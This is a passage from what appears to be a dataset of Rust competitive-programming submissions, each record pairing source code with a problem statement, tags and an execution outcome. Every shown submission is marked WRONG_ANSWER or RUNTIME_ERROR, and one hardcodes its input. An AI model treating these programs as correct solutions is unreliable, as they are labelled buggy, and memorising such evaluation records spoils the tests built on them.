max(dp[i + 1][j + 1][k], dp[i][j][k])\n                }\n                dp[i + 1][j][k] = max(dp[i + 1][j][k], dp[i][j][k]);\n                dp[i][j + 1][k] = max(dp[i][j + 1][k], dp[i][j][k]);\n            }\n        }\n    }\n    let mut ret = 0;\n    for i in 0..=s.len() {\n        for j in 0..=t.len() {\n            ret = max(ret, *dp[i][j].iter().max().unwrap());\n        }\n    }\n    println!(\"{}\", ret);\n}\n\nfn main() {\n    let mut s = String::new();\n    stdin().read_to_string(&mut s).unwrap();\n    solve(&s);\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    #[test]\n    fn test_input() {\n        let s = \"\n        \";\n        solve(s);\n    }\n}\n","description":"In mathematics, a subsequence is a sequence that can be derived from another sequence by deleting some elements without changing the order of the remaining elements. For example, the sequence BDF is a subsequence of ABCDEF. A substring of a string is a continuous subsequence of the string. For example, BCD is a substring of ABCDEF.You are given two strings s1, s2 and another string called virus. Your task is to find the longest common subsequence of s1 and s2, such that it doesn't contain virus as a substring.","input_from":"standard input","output_to":"standard output","input_spec":"The input contains three strings in three separate lines: s1, s2 and virus (1\u2009\u2264\u2009|s1|,\u2009|s2|,\u2009|virus|\u2009\u2264\u2009100). Each string consists only of uppercase English letters.","output_spec":"Output the longest common subsequence of s1 and s2 without virus as a substring. If there are multiple answers, any of them will be accepted.  If there is no valid common subsequence, output 0.","notes":null,"sample_inputs":["AJKEQSLOBSROFGZ\nOVGURWZLWVLUXTH\nOZ","AA\nA\nA"],"sample_outputs":["ORZ","0"]}
{"difficulty":2700,"lang":"Rust","lang_cluster":"rust","src_uid":"40002052843ca0357dbd3158b16d59f4","submission_id":"8424ece7b7073f487cc3e7ef2830e251","tags":["dp","greedy","graphs","number theory","math","trees"],"exec_outcome":"WRONG_ANSWER","source_code":"\/\/https:\/\/qiita.com\/tanakh\/items\/0ba42c7ca36cd29d0ac8 \u3088\u308a\nmacro_rules! input {\n    (source = $s:expr, $($r:tt)*) => {\n        let mut iter = $s.split_whitespace();\n        input_inner!{iter, $($r)*}\n    };\n    ($($r:tt)*) => {\n        let s = {\n            use std::io::Read;\n            let mut s = String::new();\n            std::io::stdin().read_to_string(&mut s).unwrap();\n            s\n        };\n        let mut iter = s.split_whitespace();\n        input_inner!{iter, $($r)*}\n    };\n}\n\nmacro_rules! input_inner {\n    ($iter:expr) => {};\n    ($iter:expr, ) => {};\n    ($iter:expr, $var:ident : $t:tt $($r:tt)*) => {\n        let $var = read_value!($iter, $t);\n        input_inner!{$iter $($r)*}\n    };\n}\n\nmacro_rules! read_value {\n    ($iter:expr, ( $($t:tt),* )) => {\n        ( $(read_value!($iter, $t)),* )\n    };\n    ($iter:expr, [ $t:tt ; $len:expr ]) => {\n        (0..$len).map(|_| read_value!($iter, $t)).collect::<Vec<_>>()\n    };\n    ($iter:expr, chars) => {\n        read_value!($iter, String).chars().collect::<Vec<char>>()\n    };\n    ($iter:expr, usize1) => {\n        read_value!($iter, usize) - 1\n    };\n    ($iter:expr, $t:ty) => {\n        $iter.next().unwrap().parse::<$t>().expect(\"Parse error\")\n    };\n}\n\n\/\/ \u3053\u3053\u307e\u3067\n\nfn run() {\n    input! {\n        n: usize,\n        a: [usize; n],\n    }\n    let m = 5000;\n    let mut weight = vec![0; m + 1];\n    for a in a {\n        if a == 0 {\n            weight[1] += 1;\n        } else {\n            weight[a] += 1;\n        }\n    }\n    let mut factor: Vec<usize> = vec![m; m + 1];\n    let mut prime = vec![];\n    for i in 2..=m {\n        if factor[i] == m {\n            for j in 1..=(m \/ i) {\n                factor[j * i] = prime.len();\n            }\n            prime.push(i);\n        }\n    }\n    let mut cnt = vec![vec![0; prime.len()]; m + 1];\n    for i in 2..=m {\n        let mut c = cnt[i - 1].clone();\n        let mut t = i;\n        while t > 1 {\n            let k = factor[t];\n            let p = prime[k];\n            while t % p == 0 {\n                c[k] += 1;\n                t \/= p;\n            }\n        }\n        cnt[i] = c;\n    }\n    let mut root_sum = 0u64;\n    for i in 1..=m {\n        root_sum += cnt[i].iter().fold(0, |s, a| s + *a) * weight[i];\n    }\n    let all = n as u64;\n    let root_sum = root_sum;\n    let mut dfs = vec![];\n    for i in 0..prime.len() {\n        let mut c = 0;\n        let r = if i == prime.len() - 1 {m + 1} else {prime[i + 1]};\n        for j in prime[i]..r {\n            c += weight[j];\n        }\n        dfs.push((prime[i], r, i, 1, c, root_sum - c + all - c));\n    }\n    let mut ans = root_sum;\n    while let Some((l, r, index, num, sum, w)) = dfs.pop() {\n        ans = std::cmp::min(ans, w);\n        if sum == 0 || l >= r || index >= prime.len() {\n            continue;\n        }\n        if cnt[l][index] > num {\n            dfs.push((l, r, index, num + 1, sum, w + all - 2 * sum));\n        } else if cnt[l][index] == cnt[r - 1][index] {\n            dfs.push((l, r, index - 1, 1, sum, w + all - 2 * sum));\n        } else {\n            let mut zero = 0;\n            let mut k = l;\n            while k < r && cnt[k][index] == cnt[l][index] {\n                zero += weight[k];\n                k += 1;\n            }\n            dfs.push((l, k, index - 1, 1, zero, w + all - 2 * zero));\n            dfs.push((k, r, index, num + 1, sum - zero, w + all - 2 * (sum - zero)));\n        }\n    }\n    println!(\"{}\", ans);\n}\n\nfn main() {\n    run();\n}\n","description":"\u00c6sir - CHAOS \u00c6sir - V.\"Everything has been planned out. No more hidden concerns. The condition of Cytus is also perfect.The time right now...... 00:01:12......It's time.\"The emotion samples are now sufficient. After almost 3 years, it's time for Ivy to awake her bonded sister, Vanessa.The system inside A.R.C.'s Library core can be considered as an undirected graph with infinite number of processing nodes, numbered with all positive integers ($$$1, 2, 3, \\ldots$$$). The node with a number $$$x$$$ ($$$x &gt; 1$$$), is directly connected with a node with number $$$\\frac{x}{f(x)}$$$, with $$$f(x)$$$ being the lowest prime divisor of $$$x$$$.Vanessa's mind is divided into $$$n$$$ fragments. Due to more than 500 years of coma, the fragments have been scattered: the $$$i$$$-th fragment is now located at the node with a number $$$k_i!$$$ (a factorial of $$$k_i$$$).To maximize the chance of successful awakening, Ivy decides to place the samples in a node $$$P$$$, so that the total length of paths from each fragment to $$$P$$$ is smallest possible. If there are multiple fragments located at the same node, the path from that node to $$$P$$$ needs to be counted multiple times.In the world of zeros and ones, such a requirement is very simple for Ivy. Not longer than a second later, she has already figured out such a node.But for a mere human like you, is this still possible?For simplicity, please answer the minimal sum of paths' lengths from every fragment to the emotion samples' assembly node $$$P$$$.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer $$$n$$$ ($$$1 \\le n \\le 10^6$$$)\u00a0\u2014 number of fragments of Vanessa's mind. The second line contains $$$n$$$ integers: $$$k_1, k_2, \\ldots, k_n$$$ ($$$0 \\le k_i \\le 5000$$$), denoting the nodes where fragments of Vanessa's mind are located: the $$$i$$$-th fragment is at the node with a number $$$k_i!$$$.","output_spec":"Print a single integer, denoting the minimal sum of path from every fragment to the node with the emotion samples (a.k.a. node $$$P$$$). As a reminder, if there are multiple fragments at the same node, the distance from that node to $$$P$$$ needs to be counted multiple times as well.","notes":"NoteConsidering the first $$$24$$$ nodes of the system, the node network will look as follows (the nodes $$$1!$$$, $$$2!$$$, $$$3!$$$, $$$4!$$$ are drawn bold):For the first example, Ivy will place the emotion samples at the node $$$1$$$. From here:  The distance from Vanessa's first fragment to the node $$$1$$$ is $$$1$$$.  The distance from Vanessa's second fragment to the node $$$1$$$ is $$$0$$$.  The distance from Vanessa's third fragment to the node $$$1$$$ is $$$4$$$. The total length is $$$5$$$.For the second example, the assembly node will be $$$6$$$. From here:  The distance from Vanessa's first fragment to the node $$$6$$$ is $$$0$$$.  The distance from Vanessa's second fragment to the node $$$6$$$ is $$$2$$$.  The distance from Vanessa's third fragment to the node $$$6$$$ is $$$2$$$.  The distance from Vanessa's fourth fragment to the node $$$6$$$ is again $$$2$$$. The total path length is $$$6$$$.","sample_inputs":["3\n2 1 4","4\n3 1 4 4","4\n3 1 4 1","5\n3 1 4 1 5"],"sample_outputs":["5","6","6","11"]}
{"difficulty":1600,"lang":"Rust 2021","lang_cluster":"rust","src_uid":"46_C","submission_id":"170791078","tags":["two+pointers"],"exec_outcome":"WRONG_ANSWER","source_code":"#![allow(non_snake_case)]\r\n#[allow(dead_code)] fn read_line() -> String { let mut buffer = String::new(); std::io::stdin().read_line(&mut buffer).expect(\"failed to read line\"); buffer }\r\n#[allow(dead_code)] fn read<T : std::str::FromStr>() -> T where T::Err: std::fmt::Debug { read_line().trim().parse::<T>().expect(\"failed to read value\") }\r\n#[allow(dead_code)]fn read_vec<T : std::str::FromStr>() -> Vec<T> where T::Err: std::fmt::Debug { read_line().split_whitespace().map(|x| x.parse::<T>().expect(\"failed to read values\")).collect() }\r\nfn lock_stdout() -> std::io::BufWriter<std::io::StdoutLock<'static>> { let stdout = std::io::stdout().lock(); std::io::BufWriter::new(stdout) }\r\nstruct StdoutLogger {buf: std::io::BufWriter<std::io::StdoutLock<'static>>}impl StdoutLogger {fn log(&mut self, s: &str) {std::io::Write::write(&mut self.buf, s.as_bytes()).expect(\"error writing stdout\");std::io::Write::write(&mut self.buf, \"\\n\".as_bytes()).expect(\"error writing stdout\");}}\r\nmacro_rules! init {($name: ident) => {let mut $name = StdoutLogger{buf:lock_stdout()};}}\r\n\r\nuse std::collections::VecDeque;\r\n\r\nfn main() {\r\n    init!(outp);\r\n\r\n\r\n    let _n = read::<usize>();\r\n    let inp = read_line();\r\n\r\n\r\n    \/\/let inp = \"HTHTHTHHT\";\r\n\r\n\r\n    let cycle = inp.chars().collect::<VecDeque<_>>();\r\n\r\n    let h_cnt = cycle.iter().filter(|&&ch| ch=='H').count();\r\n\r\n    let mut t_cnt = i32::MAX;\r\n    for i in 0..cycle.len() {\r\n        let mut remain = h_cnt;\r\n        let mut c = 0;\r\n        for j in i..i+cycle.len() {\r\n            if remain==0 {break}\r\n            if cycle[j%cycle.len()]=='T' {c+=1};\r\n            remain-=1;\r\n        }\r\n        if c<t_cnt {t_cnt=c}\r\n    }\r\n    \r\n    outp.log(&format!(\"{t_cnt}\"));\r\n\r\n}\r\n","description":"Today there is going to be an unusual performance at the circus \u2014 hamsters and tigers will perform together! All of them stand in circle along the arena edge and now the trainer faces a difficult task: he wants to swap the animals' positions so that all the hamsters stood together and all the tigers also stood together. The trainer swaps the animals in pairs not to create a mess. He orders two animals to step out of the circle and swap places. As hamsters feel highly uncomfortable when tigers are nearby as well as tigers get nervous when there's so much potential prey around (consisting not only of hamsters but also of yummier spectators), the trainer wants to spend as little time as possible moving the animals, i.e. he wants to achieve it with the minimal number of swaps. Your task is to help him.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains number n (2\u2264n\u22641000) which indicates the total number of animals in the arena. The second line contains the description of the animals' positions. The line consists of n symbols \"H\" and \"T\". The \"H\"s correspond to hamsters and the \"T\"s correspond to tigers. It is guaranteed that at least one hamster and one tiger are present on the arena. The animals are given in the order in which they are located circle-wise, in addition, the last animal stands near the first one.\n","output_spec":"Print the single number which is the minimal number of swaps that let the trainer to achieve his goal.\n","notes":"In the first example we shouldn't move anybody because the animals of each species already stand apart from the other species. In the second example you may swap, for example, the tiger in position 2 with the hamster in position 5 and then \u2014 the tiger in position 9 with the hamster in position 7.\n","sample_inputs":["3\nHTH\n","9\nHTHTHTHHT\n"],"sample_outputs":["0\n","2\n"]}
{"difficulty":1600,"lang":"Rust 2021","lang_cluster":"rust","src_uid":"52_B","submission_id":"189493937","tags":["combinatorics"],"exec_outcome":"RUNTIME_ERROR","source_code":"fn main() {\n    let mut s = String::new();\n    std::io::stdin().read_line(&mut s).unwrap();\n    let s: Vec<u32> = s.split_whitespace().map(|x| x.parse().unwrap()).collect();\n\n    let n = s[0];\n    let m = s[1];\n\n    let mut cols: Vec<u32> = [].to_vec();\n    let mut rows: Vec<u32> = [].to_vec();\n    let mut board: Vec<Vec<char>> = [].to_vec();\n\n    for k in 0..n {\n        let mut x = String::new();\n        std::io::stdin().read_line(&mut x).unwrap();\n        let x: Vec<char> = x.chars().collect::<Vec<char>>()[..m as usize].to_vec();\n        board.push(x.clone());\n\n        rows.push(0);\n\n        for (i, &e) in x.iter().enumerate() {\n            if e == '*' {\n                rows[k as usize] += 1;\n            }\n            if k == 0 {\n                cols.push(if e == '*' { 1 } else { 0 });\n            }\n            else {\n                if e == '*' {\n                    cols[i] += 1;\n                }\n            }\n        }\n    }\n\n    let mut count = 0;\n\n    for i in 0..n {\n        for j in 0..m {\n            if board[i as usize][j as usize] == '*' {\n                count += (rows[i as usize] - 1) * (cols[j as usize] - 1);\n            }\n        }\n    }\n\n    println!(\"{}\", count);\n}\n","description":"You are given a n\u00d7m field consisting only of periods ('.') and asterisks ('*'). Your task is to count all right triangles with two sides parallel to the square sides, whose vertices are in the centers of '*'-cells. A right triangle is a triangle in which one angle is a right angle (that is, a 90 degree angle).","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two positive integer numbers n and m (1\u2264n,m\u22641000). The following n lines consist of m characters each, describing the field. Only '.' and '*' are allowed.\n","output_spec":"Output a single number \u2014 total number of square triangles in the field. Please, do not use %lld specificator to read or write 64-bit integers in C++. It is preffered to use cout (also you may use %I64d).\n","notes":null,"sample_inputs":["2 2\n**\n*.\n","3 4\n*..*\n.**.\n*.**\n"],"sample_outputs":["1\n","9\n"]}
{"difficulty":2400,"lang":"Rust","lang_cluster":"rust","src_uid":"63e130256e23bd0693c6a1bede5e937e","submission_id":"re_1270","tags":["number theory","math","matrices","implementation","data structures"],"exec_outcome":"RUNTIME_ERROR","source_code":"\/\/spnauti-rusT {{{\nuse std::io::*; use std::str::{self,*}; use std::fmt::Debug;\n#[allow(unused_imports)] use std::cmp::Ordering::{self,*};\n#[allow(unused_imports)] use std::ops::{self,*};\n#[allow(unused_imports)] use std::iter::{self,*};\n#[allow(unused_imports)] use std::collections::*;\n#[allow(unused_imports)] use std::cell::*;\n#[allow(unused_macros)] macro_rules! m {\n\t($c:tt,$x:expr,$y:expr) => {{\n\t\tlet b=$y; let a=&mut$x; if b$c*a {*a=b; true} else {false}\n\t}};\n}\n#[allow(unused_macros)] macro_rules! l {\n\t($($v:ident),+ =$e:expr) => {$(let$v=$e;)+};\n\t($($v:ident),+:$t:ty=$e:expr) => {$(let$v:$t=$e;)+};\n\t(mut $($v:ident),+ =$e:expr) => {$(let mut$v=$e;)+};\n\t(mut $($v:ident),+:$t:ty=$e:expr) => {$(let mut$v:$t=$e;)+};\n}\n#[allow(unused_macros)] macro_rules! rep { {[$c:expr]$($s:tt)+} => {for _ in 0..$c {$($s)+}} }\n#[allow(dead_code)] fn reader() -> WordReaderC { WordReaderC::new() }\n#[allow(dead_code)] fn writer() -> BufWriter<Stdout> { BufWriter::new(stdout()) }\nstruct WordReaderC {buf: Vec<u8>, pos: usize, q: std::io::StdinLock<'static>}\/\/'\n#[allow(dead_code)] impl WordReaderC {\n\tfn new() -> Self {\n\t\tlet r = unsafe {&*Box::into_raw(Box::new(stdin()))};\n\t\tSelf { q: r.lock(), buf: Vec::new(), pos: 0 }\n\t}\n\tfn next_line(&mut self) -> bool {\n\t\tself.buf.clear(); self.pos = 0;\n\t\tself.q.read_until(b'\\n', &mut self.buf).unwrap_or(0) > 0\n\t}\n\tfn is_ws(c: u8) -> bool {\n\t\tc == b' ' || c == b'\\r' || c == b'\\n' || c == b'\\t'\n\t}\n\tfn byte(&mut self) -> Option<u8> {\n\t\tif self.pos == self.buf.len() { if !self.next_line() { return None; } }\n\t\tself.pos += 1; Some(self.buf[self.pos - 1])\n\t}\n\tfn vb(&mut self) -> Vec<u8> {\n\t\tlet mut s = Vec::with_capacity(8);\n\t\tlet mut f = false;\n\t\tloop {\n\t\t\tif let Some(c) = self.byte() {\n\t\t\t\tif !Self::is_ws(c) {\n\t\t\t\t\ts.push(c);\n\t\t\t\t\tf = true;\n\t\t\t\t} else if f { break; }\n\t\t\t} else { break; }\n\t\t}\n\t\ts\n\t}\n\tfn s(&mut self) -> String { String::from_utf8(self.vb()).expect(\"invalid utf8\") }\n\tfn i(&mut self) ->    i32 { self.p() }\n\tfn l(&mut self) ->    i64 { self.p() }\n\tfn u(&mut self) ->  usize { self.p() }\n\tfn f(&mut self) ->    f64 { self.p() }\n\tfn vi(&mut self, n: usize) -> Vec<i32> { self.vp(n) }\n\tfn vl(&mut self, n: usize) -> Vec<i64> { self.vp(n) }\n\tfn vu(&mut self, n: usize) -> Vec<usize> { self.vp(n) }\n\tfn ii(&mut self, n: usize) -> impl Iterator<Item=i32> { self.ip(n).into_iter() }\n\tfn iu(&mut self, n: usize) -> impl Iterator<Item=usize> { self.ip(n).into_iter() }\n\tfn p<T: FromStr>(&mut self) -> T where T::Err: Debug {\n\t\tlet w = self.vb(); str::from_utf8(w.as_ref()).unwrap().parse::<T>().unwrap()\n\t}\n\tfn vp<T: FromStr>(&mut self, n: usize) -> Vec<T> where T::Err: Debug {\n\t\t(0..n).map(|_|self.p()).collect()\n\t}\n\tfn ip<T: FromStr>(&mut self, n: usize) -> impl Iterator<Item=T> where T::Err: Debug {\n\t\tself.vp(n).into_iter()\n\t}\n}\n\/\/------------------- End rusT }}}\n\n\/\/ Mint (mod any) {{{\n#[derive(Debug,Clone,Copy,PartialEq,Eq,PartialOrd,Ord,Default)] struct Mint(i32,i32);\n#[allow(dead_code)] impl Mint {\n\tfn new<T: Copy+Into<i64>>(a: T, m: T) -> Self { Self(Self::cv(a,m),m.into() as i32) }\n\tunsafe fn new_unchecked(a: i32, m: i32) -> Self { Self(a,m) }\n\tfn hi(mut a: i32, m: i32) -> i32 { if a >= m { a -= m; } a }\n\tfn lo(mut a: i32, m: i32) -> i32 { if a < 0 { a += m; } a }\n\tfn cv<T: Copy+Into<i64>>(a: T, m: T) -> i32 { Self::lo((a.into() % m.into()) as i32, m.into() as i32) }\n\tunsafe fn inv(self) -> Self { self.pow(self.1-2) } \/\/ ONLY FOR PRIMES!\n\tfn pow<T: Copy+Into<i64>>(self, b: T) -> Self {\n\t\tlet b = b.into(); if b == 0 { Self(1,self.1) } else {\n\t\t\tlet mut res = self.pow(b\/2); res *= res; if b % 2 == 1 {res *= self;} res\n\t\t}\n\t}\n}\nimpl Add for Mint { type Output = Self; fn add(self, a: Self) -> Self::Output { assert!(self.1==a.1); Self(Self::hi(self.0 + a.0, self.1), self.1) }}\nimpl Sub for Mint { type Output = Self; fn sub(self, a: Self) -> Self::Output { assert!(self.1==a.1); Self(Self::lo(self.0 - a.0, self.1), self.1) }}\nimpl Mul for Mint { type Output = Self; fn mul(self, a: Self) -> Self::Output { assert!(self.1==a.1); Self(Self::cv(self.0 as i64 * a.0 as i64, self.1 as i64), self.1) }}\nimpl Div for Mint { type Output = Self; fn div(self, a: Self) -> Self::Output { self * unsafe {a.inv()} }}\nimpl Neg for Mint { type Output = Self; fn neg(self) -> Self::Output { Self(Self::lo(-self.0, self.1), self.1) }}\nimpl AddAssign for Mint { fn add_assign(&mut self, a: Self) { *self = *self + a; } }\nimpl SubAssign for Mint { fn sub_assign(&mut self, a: Self) { *self = *self - a; } }\nimpl MulAssign for Mint { fn mul_assign(&mut self, a: Self) { *self = *self * a; } }\nimpl DivAssign for Mint { fn div_assign(&mut self, a: Self) { *self = *self \/ a; } }\nuse std::fmt::{Display, Formatter, Result};\nimpl Display for Mint { fn fmt(&self, f: &mut Formatter) -> Result { write!(f, \"{}\", self.0) } }\n\/\/}}}\n\n\/\/ Square Matrix {{{\ntype MatT = Mint;\n#[derive(Debug,Clone)] struct Mat { n: usize, a: Vec<MatT>, v0: MatT, v1: MatT }\n#[allow(dead_code)] impl Mat {\n\tfn new(n:usize,v0:MatT,v1:MatT)->Self{Self{n,a:vec![v0;n*n],v0,v1}}\n\tfn diag(n:usize,v0:MatT,v1:MatT,v:MatT)->Self{let mut m=Self::new(n,v0,v1);let mut p=0;for _ in 0..n{m.a[p]=v;p+=n+1;}m}\n\tfn pow(&self,n:u64)->Self{if n==0{Self::diag(self.n,self.v0,self.v1,self.v1)}else{let mut t=self.pow(n\/2);t*=t.clone();if n%2==1{t*=self.clone();}t}}\n\tfn range(&self,r:Range<usize>,c:Range<usize>)->Vec<Vec<MatT>>{if r.start<r.end||c.start<c.end{Vec::new()}else{let mut res=vec![vec![self.v0;c.end-c.start];r.end-r.start];\n\t\tfor i in r.start..r.end{let ir=i-r.start;let ii=i*self.n+c.start;for j in 0..c.end-c.start{res[ir][j]=self.a[ii+j];}}res}}\n\tfn at(&self,r:usize,c:usize)->MatT{self.a[r*self.n+c]}\n\tfn at_mut<'a>(&'a mut self,r:usize,c:usize)->&'a mut MatT{&mut self.a[r*self.n+c]}\/\/'\n}\nimpl Mul for Mat{type Output=Self;fn mul(self,o:Self)->Self::Output{assert!(self.n==o.n);let n=self.n;let mut res=Self::new(n,self.v0,self.v1);\n\tfor ii in(0..n).map(|i|i*n){for j in 0..n{let mut t=self.v0;let mut kk=j;for k in 0..n{t+=self.a[ii+k]*o.a[kk];kk+=n;}res.a[ii+j]=t;}}res}}\nimpl Add for Mat{type Output=Self;fn add(mut self,o:Self)->Self{self+=o;self}}\nimpl Sub for Mat{type Output=Self;fn sub(mut self,o:Self)->Self{self-=o;self}}\nimpl MulAssign for Mat{fn mul_assign(&mut self,a:Self){*self=self.clone()*a;}}\nimpl AddAssign for Mat{fn add_assign(&mut self,o:Self){assert!(self.n==o.n);for(x,y)in self.a.iter_mut().zip(o.a.into_iter()){*x+=y;}} }\nimpl SubAssign for Mat{fn sub_assign(&mut self,o:Self){assert!(self.n==o.n);for(x,y)in self.a.iter_mut().zip(o.a.into_iter()){*x-=y;}} }\nimpl PartialEq for Mat{fn eq(&self,o:&Self)->bool{self.n==o.n&&self.a==o.a}}impl Eq for Mat{}\n\/\/ }}}\n\nfn main() {\n\tlet mut rin = reader();\n\tlet mut rout = writer();\n\n\tl!(m,l,r,k = rin.l());\n\tlet g = || -> i64 {\n\t\tfor d in (1..(r-l)\/(k-1)).rev() {\n\t\t\tif r \/ d - (l-1) \/ d >= k {\n\t\t\t\treturn d;\n\t\t\t}\n\t\t}\n\t\tpanic!(\"no\")\n\t}();\n\tlet f1 = Mint::new(1,m);\n\tlet f0 = Mint::new(0,m);\n\tlet mut mat = Mat::new(2,f0,f1);\n\t*mat.at_mut(0,0) = f0;\n\t*mat.at_mut(0,1) = f1;\n\t*mat.at_mut(1,0) = f1;\n\t*mat.at_mut(1,1) = f1;\n\tlet sol = mat.pow(g as u64).at(0,1);\n\twriteln!(rout, \"{}\", sol).ok();\n}\n\n","description":"There are less than 60 years left till the 900-th birthday anniversary of a famous Italian mathematician Leonardo Fibonacci. Of course, such important anniversary needs much preparations.Dima is sure that it'll be great to learn to solve the following problem by the Big Day: You're given a set A, consisting of numbers l, l\u2009+\u20091, l\u2009+\u20092, ..., r; let's consider all its k-element subsets; for each such subset let's find the largest common divisor of Fibonacci numbers with indexes, determined by the subset elements. Among all found common divisors, Dima is interested in the largest one.Dima asked to remind you that Fibonacci numbers are elements of a numeric sequence, where F1\u2009=\u20091, F2\u2009=\u20091, Fn\u2009=\u2009Fn\u2009-\u20091\u2009+\u2009Fn\u2009-\u20092 for n\u2009\u2265\u20093.Dima has more than half a century ahead to solve the given task, but you only have two hours. Count the residue from dividing the sought largest common divisor by m.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains four space-separated integers m, l, r and k (1\u2009\u2264\u2009m\u2009\u2264\u2009109;\u00a01\u2009\u2264\u2009l\u2009&lt;\u2009r\u2009\u2264\u20091012;\u00a02\u2009\u2264\u2009k\u2009\u2264\u2009r\u2009-\u2009l\u2009+\u20091). Please, do not use the %lld specifier to read or write 64-bit integers in \u0421++. It is preferred to use cin, cout streams or the %I64d specifier.","output_spec":"Print a single integer \u2014 the residue from dividing the sought greatest common divisor by m.","notes":null,"sample_inputs":["10 1 8 2","10 1 8 3"],"sample_outputs":["3","1"]}
{"difficulty":1600,"lang":"Rust","lang_cluster":"rust","src_uid":"68_B","submission_id":"gpt3_68_B_2","tags":["binary+search"],"exec_outcome":"WRONG_ANSWER","source_code":"fn main() {\n    let input = \"3 50\\n4 2 1\\n\";\n    let mut lines = input.lines();\n    let nk: Vec<i32> = lines\n        .next()\n        .unwrap()\n        .split_whitespace()\n        .map(|x| x.parse().unwrap())\n        .collect();\n    let n = nk[0];\n    let k = nk[1];\n    let a: Vec<i32> = lines\n        .next()\n        .unwrap()\n        .split_whitespace()\n        .map(|x| x.parse().unwrap())\n        .collect();\n    let mut min_energy = i32::MAX;\n    for i in 0..n {\n        min_energy = min_energy.min(a[i]);\n    }\n    let mut max_energy = i32::MIN;\n    for i in 0..n {\n        max_energy = max_energy.max(a[i]);\n    }\n    let mut low = min_energy as f64;\n    let mut high = max_energy as f64;\n    while high - low > 1e-6 {\n        let mid = (low + high) \/ 2.0;\n        let mut total_loss = 0.0;\n        for i in 0..n {\n            if a[i] > mid as i32 {\n                total_loss += (a[i] - mid as i32) as f64 * (k as f64 \/ 100.0);\n            }\n            else {\n                total_loss -= (mid as i32 - a[i]) as f64 * (k as f64 \/ 100.0);\n            }\n        }\n        if total_loss > 0.0 {\n            low = mid;\n        }\n        else {\n            high = mid;\n        }\n    }\n    println!(\"{:.9}\", low);\n}","description":"It is well known that the planet suffers from the energy crisis. Little Petya doesn't like that and wants to save the world. For this purpose he needs every accumulator to contain the same amount of energy. Initially every accumulator has some amount of energy: the i-th accumulator has ai units of energy. Energy can be transferred from one accumulator to the other. Every time x units of energy are transferred (x is not necessarily an integer) k percent of it is lost. That is, if x units were transferred from one accumulator to the other, amount of energy in the first one decreased by x units and in other increased by  units.Your task is to help Petya find what maximum equal amount of energy can be stored in each accumulator after the transfers.","input_from":"standard input","output_to":"standard output","input_spec":"First line of the input contains two integers n and k (1\u2264n\u226410000,0\u2264k\u226499) \u2014 number of accumulators and the percent of energy that is lost during transfers.\nNext line contains n integers a1,a2,... ,an \u2014 amounts of energy in the first, second, .., n-th accumulator respectively (0\u2264ai\u22641000,1\u2264i\u2264n).\n","output_spec":"Output maximum possible amount of energy that can remain in each of accumulators after the transfers of energy.\nThe absolute or relative error in the answer should not exceed 10^-6.\n","notes":null,"sample_inputs":["3 50\n4 2 1\n","2 90\n1 11\n"],"sample_outputs":["2.000000000\n","1.909090909\n"]}
{"difficulty":2500,"lang":"Rust","lang_cluster":"rust","src_uid":"6bd41042c6a442765cd93c73d55f6189","submission_id":"f7aae9091bad9c87584fca75b8cf3507","tags":["data structures","hashing","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"\/\/ ---------- begin SegmentTree Point update Range query ----------\nmod segment_tree {\n    pub struct PURQ<T: Clone, F: Fn(T, T) -> T> {\n        n: usize,\n        a: Vec<T>,\n        id: T,\n        op: F,\n    }\n    #[allow(dead_code)]\n    impl<T: Clone, F: Fn(T, T) -> T> PURQ<T, F> {\n        pub fn new(n: usize, id: T, op: F) -> PURQ<T, F> {\n            let mut k = 1;\n            while k < n {\n                k *= 2;\n            }\n            PURQ {\n                n: k,\n                a: vec![id.clone(); 2 * k],\n                id: id,\n                op: op,\n            }\n        }\n        pub fn update(&mut self, x: usize, v: T) {\n            let mut k = self.n + x;\n            let a = &mut self.a;\n            a[k] = v;\n            k >>= 1;\n            while k > 0 {\n                a[k] = (self.op)(a[2 * k].clone(), a[2 * k + 1].clone());\n                k >>= 1;\n            }\n        }\n        pub fn update_tmp(&mut self, x: usize, v: T) {\n            self.a[x + self.n] = v;\n        }\n        pub fn update_all(&mut self) {\n            for k in (1..(self.n)).rev() {\n                self.a[k] = (self.op)(self.a[2 * k].clone(), self.a[2 * k + 1].clone());\n            }\n        }\n        pub fn find(&self, mut l: usize, mut r: usize) -> T {\n            let mut p = self.id.clone();\n            let mut q = self.id.clone();\n            l += self.n;\n            r += self.n;\n            while l < r {\n                if (l & 1) == 1 {\n                    p = (self.op)(p, self.a[l].clone());\n                    l += 1;\n                }\n                if (r & 1) == 1 {\n                    r -= 1;\n                    q = (self.op)(self.a[r].clone(), q);\n                }\n                l >>= 1;\n                r >>= 1;\n            }\n            (self.op)(p, q)\n        }\n    }\n}\n\/\/ ---------- end SegmentTree Point update Range query ----------\n\nconst MOD: u64 = (1u64 << 61) - 1;\n\n#[derive(Clone, Copy, PartialEq, Eq)]\nstruct ModInt(u64);\n\nimpl std::ops::Add for ModInt {\n    type Output = Self;\n    fn add(self, rhs: Self) -> Self::Output {\n        assert!(self.0 < MOD && rhs.0 < MOD);\n        let mut d = self.0 + rhs.0;\n        if d >= MOD {\n            d -= MOD;\n        }\n        ModInt(d)\n    }\n}\n\nimpl std::ops::Sub for ModInt {\n    type Output = Self;\n    fn sub(self, rhs: Self) -> Self::Output {\n        assert!(self.0 < MOD && rhs.0 < MOD);\n        let mut d = self.0 + MOD - rhs.0;\n        if d >= MOD {\n            d -= MOD;\n        }\n        ModInt(d)\n    }\n}\n\nimpl std::ops::Mul for ModInt {\n    type Output = Self;\n    fn mul(self, rhs: Self) -> Self::Output {\n        assert!(self.0 < MOD && rhs.0 < MOD);\n        const MASK31: u64 = (1u64 << 31) - 1;\n        const MASK30: u64 = (1u64 << 30) - 1;\n        let au = self.0 >> 31;\n        let ad = self.0 & MASK31;\n        let bu = rhs.0 >> 31;\n        let bd = rhs.0 & MASK31;\n        let mid = ad * bu + au * bd;\n        let midu = mid >> 30;\n        let midd = mid & MASK30;\n        let sum = au * bu * 2 + midu + (midd << 31) + ad * bd;\n        let mut ans = (sum >> 61) + (sum & MOD);\n        if ans >= MOD {\n            ans -= MOD;\n        }\n        ModInt(ans)\n    }\n}\n\nimpl ModInt {\n    fn new(v: u64) -> Self {\n        ModInt(v % MOD)\n    }\n    fn zero() -> Self {\n        ModInt(0)\n    }\n    fn pow(&self, n: u64) -> Self {\n        let mut t = 